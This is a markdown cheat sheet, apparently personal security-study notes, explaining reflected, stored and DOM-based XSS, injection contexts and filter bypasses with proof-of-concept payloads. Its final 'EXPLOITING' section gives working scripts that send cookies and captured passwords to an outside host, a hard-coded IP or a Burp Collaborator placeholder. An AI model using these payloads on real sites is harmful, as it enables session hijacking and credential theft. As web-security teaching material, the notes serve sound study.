---
title: XSS
category: web
order: 1
---




There are three main types of XSS attacks. These are:

### Reflected XSS
 where the malicious script comes from the current HTTP request.
### Stored XSS
where the malicious script comes from the website's database.
### DOM-based XSS
where the vulnerability exists in client-side code rather than server-side code.


# REFLECTED XSS
---

Reflected cross-site scripting (or XSS) arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way.
Suppose a website has a search function which receives the user-supplied search term in a URL parameter:

https://insecure-website.com/search?term=gift

The application echoes the supplied search term in the response to this URL:

<p>You searched for: gift</p>
```
https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script>
```

# STORED - aka persistent or second-order XSS
---

Stored cross-site scripting  arises when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way.

Suppose a website allows users to submit comments on blog posts, which are displayed to other users. Users submit comments using an HTTP request like the following:
```
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Length: 100

postId=3&comment=This+post+was+extremely+helpful.&name=Carlos+Montoya&email=carlos%40normal-user.net
```
url encoded with xss:
```
comment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E
```

# DOM - Based XSS
---

DOM-based XSS (also known as DOM XSS) arises when an application contains some client-side JavaScript that processes data from an untrusted source in an unsafe way, usually by writing the data to a potentially dangerous sink within the DOM.

source: A source is a JavaScript property that contains data that an attacker could potentially control. An example of a source is location.search, which reads input from the query string.

sink: A sink is a function or DOM object that allows JavaScript code execution or rendering of HTML. An example of a code execution sink is eval, and an example of an HTML sink is document.body.innerHTML.


In principle, an application is vulnerable to DOM-based cross-site scripting if there is an executable path via which data can propagate from source to sink. In practice, different sources and sinks have differing properties and behavior that can affect exploitability, and determine what techniques are necessary. Additionally, the application's scripts might perform validation or other processing of data that must be accommodated when attempting to exploit a vulnerability. There are a variety of sources and sinks that are relevant to DOM-based vulnerabilities.

The document.write sink works with script elements, so you can use a simple payload such as:
```
document.write('... <script>alert(document.domain)</script> ...');
```

The innerHTML sink doesn't accept script elements on any modern browser, nor will svg onload events fire. This means you will need to use alternative elements like img or iframe. Event handlers such as onload and onerror can be used in conjunction with these elements. For example:
```
element.innerHTML='... <img src=1 onerror=alert(document.domain)> ...'
```

# CONTEXT
---
When testing for reflected and stored XSS, a key task is to identify the XSS context:

The location within the response where attacker-controllable data appears.
Any input validation or other processing that is being performed on that data by the application.

### XSS between html tags
```
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>
```

### xss in html tag attributes
When the XSS context is into an HTML tag attribute value, you might sometimes be able to terminate the attribute value, close the tag, and introduce a new one. For example:
```
"><script>alert(document.domain)</script>
```


More commonly in this situation, angle brackets are blocked or encoded, so your input cannot break out of the tag in which it appears. Provided you can terminate the attribute value, you can normally introduce a new attribute that creates a scriptable context, such as an event handler. For example:
```
" autofocus onfocus=alert(document.domain) x="
```

```
<a href="javascript:alert(document.domain)">
```

### xss in javascript

**Terminating the existing script**
In the simplest case, it is possible to simply close the script tag that is enclosing the existing JavaScript, and introduce some new HTML tags that will trigger execution of JavaScript. For example, if the XSS context is as follows:

```
</script><img src=1 onerror=alert(document.domain)>
```
**Breaking out of a JavaScript string**
```
'-alert(document.domain)-'
';alert(document.domain)//
```

**Making use of HTML-encoding**

When the XSS context is some existing JavaScript within a quoted tag attribute, such as an event handler, it is possible to make use of HTML-encoding to work around some input filters.
For example, if the XSS context is as follows:
```
<a href="#" onclick="... var input='controllable data here'; ...">
```
and the application blocks or escapes single quote characters, you can use the following payload to break out of the JavaScript string and execute your own script:
```
&apos;-alert(document.domain)-&apos;
```
The &apos; sequence is an HTML entity representing an apostrophe or single quote

**XSS in JavaScript template literals**
JavaScript template literals are string literals that allow embedded JavaScript expressions. The embedded expressions are evaluated and are normally concatenated into the surrounding text. Template literals are encapsulated in backticks instead of normal quotation marks, and embedded expressions are identified using the ${...} syntax.

For example, the following script will print a welcome message that includes the user's display name:

document.getElementById(‘message’).innerText = `Welcome, ${user.displayName}.`;

When the XSS context is into a JavaScript template literal, there is no need to terminate the literal. Instead, you simply need to use the ${...} syntax to embed a JavaScript expression that will be executed when the literal is processed. For example, if the XSS context is as follows:
```
<script>
...
var input = `controllable data here`;
...
</script>
```
then you can use the following payload to execute JavaScript without terminating the template literal:
```
${alert(document.domain)}
```

# EXPLOITING
---
## steal cookies
```
<script>
new Image().src="http://192.168.30.5:81/bogus.php?ouput="+document.cookie;
</script>
```
```
<script>
fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

## capture passwords
```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
